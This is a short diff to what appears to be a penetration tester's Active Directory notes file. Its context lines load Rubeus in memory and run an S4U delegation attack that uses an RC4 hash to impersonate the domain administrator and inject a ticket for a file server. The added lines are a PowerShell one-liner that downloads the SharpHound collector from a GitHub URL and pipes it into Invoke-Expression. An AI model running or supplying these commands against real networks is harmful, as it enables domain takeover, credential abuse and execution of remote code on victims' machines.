@@ -12,3 +12,7 @@ $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("purge".Split())
 [Rubeus.Program]::Main("s4u /user:web01$ /rc4:5247db490c394e2cdc86072a8c7b5e45 /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
 ```
+
+```
+(new-object system.net.webclient).downloadstring('https://github.com/i223t/binaries/raw/main/Windows/Bloodhound/SharpHound.ps1') | IEX 
+```
